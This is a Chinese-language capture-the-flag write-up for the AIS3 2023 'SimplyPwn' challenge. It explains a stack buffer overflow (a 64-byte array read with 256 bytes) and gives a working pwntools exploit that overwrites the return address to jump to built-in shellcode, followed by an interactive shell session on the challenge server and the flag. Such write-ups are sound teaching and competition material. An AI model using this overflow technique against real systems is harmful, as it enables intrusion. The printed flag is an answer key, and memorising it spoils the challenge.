# SimplyPwn
## 題目

![image](https://user-images.githubusercontent.com/57281249/239932495-6a0bafff-9626-4400-80ff-eebe9e2ac101.png)

## 解題
1. IDA 打開
2. 人真好有給 shell code
![image](https://user-images.githubusercontent.com/57281249/239933559-f2a98b42-9d2a-4daa-8d46-ea66fac90097.png)
3. array 最長 64 bytes 然後 read 256 bytes 一臉就會 stack overflow.
![image](https://user-images.githubusercontent.com/57281249/239943925-86da7a51-43c9-4d25-abb2-970d7d4fceba.png)
4. 找 shell code 的位置
![image](https://user-images.githubusercontent.com/57281249/239944562-8c292e6c-fa5d-46c9-95dd-a81dbea6c5e5.png)
5. exploit
```python
import pwn
import re
import sys

r = pwn.remote('chals1.ais3.org', 11111)

print(r.recvrepeat(timeout=1).decode())
r.send(b'x'*(8*10-1) + int('4017A9', 16).to_bytes(3, 'little'))
r.recvrepeat(timeout=1)

while True:
    print(r.recvrepeat(timeout=1).decode(), end='')
    print('> ', end='')
    r.send(input().encode())
#    r.send(sys.stdin.buffer.read())
```

```
chummy@hitcon:~/ais3preexam2023$ python3 simpwnexp.py
[+] Opening connection to chals1.ais3.org on port 11111: Done
Show me your name:
> ls
FLAG
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
runtime
sbin
srv
sys
tmp
usr
var
> cat FLAG
AIS3{5imP1e_Pwn_4_beGinn3rs!}
> exit
>
>
[*] Closed connection to chals1.ais3.org port 11111
Traceback (most recent call last):
  File "/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/sock.py", line 65, in send_raw
    self.sock.sendall(data)
BrokenPipeError: [Errno 32] Broken pipe

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/chummy/ais3preexam2023/simpwnexp.py", line 14, in <module>
    r.send(input().encode())
  File "/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/tube.py", line 778, in send
    self.send_raw(data)
  File "/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/sock.py", line 70, in send_raw
    raise EOFError
EOFError
```

## Flag
`AIS3{5imP1e_Pwn_4_beGinn3rs!}`